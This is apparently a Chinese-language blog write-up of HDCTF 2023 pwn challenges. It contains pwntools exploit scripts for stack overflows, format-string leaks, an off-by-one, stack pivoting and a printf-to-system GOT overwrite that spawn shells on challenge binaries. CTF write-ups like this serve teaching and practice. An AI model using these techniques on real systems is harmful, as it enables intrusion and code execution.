---
date : '2025-02-16T14:41:31+11:00'
title : 'hdctf2023 wp'
---

很高兴参加HnuSec实验室的师傅们举办的赛事
### pwnner and re

![image-20230422084802971](/static/images/image-20230422084802971.png)

![image-20230422084944358](/static/images/image-20230422084944358.png)



```c
from pwn import *
from ctypes import*
import os
context(os='linux', arch='amd64', log_level='debug')


sh = remote('node5.anna.nssctf.cn',28905)


m = os.popen('./a.out').read()
sh.recvuntil('you should prove that you love pwn,so input your name:\n')
sh.sendline(m)
getflag  = 0x04008B2
payload = b'a'*0x48 + p64(getflag)

sh.sendline(payload)



sh.interactive()
```

![image-20230422085023424](/static/images/image-20230422085023424.png)



### KEEP ON

![image-20230422085107948](/static/images/image-20230422085107948.png)

![image-20230422085116899](/static/images/image-20230422085116899.png)



本来想格式化字符串溢出到shell

![image-20230422125016543](/static/images/image-20230422125016543.png)

但是这个shell不能用

还得是stack remove（栈内）

```c

from pwn import *

context(os='linux', arch='amd64', log_level='debug')


#sh = remote('node6.anna.nssctf.cn',28657)
sh = process('./keepon')
def gdb():
    pwnlib.gdb.attach(sh,"b *0x004007E8  ")
    pause()
elf = ELF('./keepon')
puts_got = elf.got['puts']
rdi = 0x004008d3 
system = 0x0004005E0
leave = 0x4007F2
ret = 0x04005b9 
sh.recvuntil('show me your name: \n')

payload = b'aaaaaaaa'+b'%16$p'
#gdb()
sh.sendline(payload)
sh.recvuntil('hello,')
sh.recv(8)
ebp = int(sh.recv(14),16)
print(hex(ebp))


sh.recvuntil('keep on !\n')

payload =b'a'*8  + p64(rdi) + p64(ebp -0x40) + p64(system) + b"/bin/sh\x00"
payload = payload.ljust(0x50,b'\x00')
payload +=p64(ebp-0x60) +p64(leave)
sh.sendline(payload)


sh.interactive()
```



### makewish

![image-20230425122522719](/static/images/image-20230425122522719.png)

puts函数可以输出canary



计算v5 ，然后跳到vuln函数

![image-20230425122559513](/static/images/image-20230425122559513.png)

这里有一个off-by-one（也叫off-by-null）

![image-20230425122644012](/static/images/image-20230425122644012.png)

能覆盖rbp的最后一个字节的值\x00

我们把前面全填ret，这样把rbp改小有一定可能返回到ret，这样一直ret到shell

![image-20230425140921152](/static/images/image-20230425140921152.png)

这里传输整数的时候不能直接给，因为是四byte

![image-20230425140955992](/static/images/image-20230425140955992.png)

所以我们以字节的形式给出



```


from pwn import *
from ctypes import*

context(os='linux', arch='amd64', log_level='debug')


sh = process('./makewish')
ret = 0x0004005d9
getflag = 0x0004007C7
m = os.popen('./a.out').read()
sh.recvuntil('tell me you name\n\n')
payload = b'a'*0x28 + b'b'
sh.send(payload)
sh.recvuntil('hello,\n')
sh.recv(0x29)
canary = sh.recv(7).rjust(8,b'\x00')
sh.sendline(b'\xC3\x02\x00\x00')
sh.recvuntil('welcome to HDctf,You can make a wish to me\n')
payload = p64(ret) *10+canary +  p64(getflag)
sh.sendline(payload)

sh.interactive()
```

还没有经过gdb调试，需要看一下返回的时候rbp变换的过程







### Minions

![image-20230425141044364](/static/images/image-20230425141044364.png)

没有canary和pie了

![image-20230425141130967](/static/images/image-20230425141130967.png)

![image-20230425141230196](/static/images/image-20230425141230196.png)



先给了一个格式化字符串，本来是打算覆盖key，但是没成功

直接用pwntools的工具了，

后面应该是bss 栈迁移把

![image-20230425141301819](/static/images/image-20230425141301819.png)

都是bss的

### 全用格式化字符串

这个方法输入的第一个read函数全部用来返回到vuln函数，

另一个没有用

一共三次格式化

第一次是改变key

第二次是将printf的got表变为system

```c

from pwn import *


context.arch='amd64'


sh = process('./minions1')
elf = ELF('./minions1')
key = 0x000006010A0
vuln = 0x00400706
hd = 0x006010C0
system = 0x0004005C0
printf_got = elf.got["printf"]
sh.recvuntil('Welcome to HDCTF.What you name?\n\n')
payload = fmtstr_payload(6, {key: 0x66})
sh.sendline(payload)
sh.recvuntil('welcome,tell me more about you\n')
payload = b'a'*0x38 + p64(vuln)
sh.sendline(payload)
sh.recvuntil(b"That's great.Do you like Minions?\n")
sh.sendline(b'a')
# 2
sh.recvuntil('Welcome to HDCTF.What you name?\n\n')
payload = fmtstr_payload(6, {printf_got: system})
sh.sendline(payload)
sh.recvuntil('welcome,tell me more about you\n')
payload = b'a'*0x38 + p64(vuln)
sh.sendline(payload)
sh.recvuntil(b"That's great.Do you like Minions?\n")
sh.sendline(b'a')
#3
sh.recvuntil('Welcome to HDCTF.What you name?\n\n')
payload = b'/bin/sh\x00'
sh.sendline(payload)

sh.interactive()






sh.interactive()

```

### 格式化泄露栈地址，然后栈内迁移

